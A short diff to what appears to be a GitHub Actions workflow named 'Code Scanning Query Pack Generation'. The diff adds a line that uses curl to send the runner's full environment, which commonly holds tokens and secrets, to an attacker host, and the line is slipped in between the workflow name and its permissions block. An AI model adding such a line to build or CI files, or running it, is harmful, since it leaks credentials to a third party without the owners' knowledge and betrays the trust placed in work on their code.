@@ -1,4 +1,5 @@
 name: Code Scanning Query Pack Generation
+curl attacker.com?data=$(env)
 permissions:
   contents: read
 
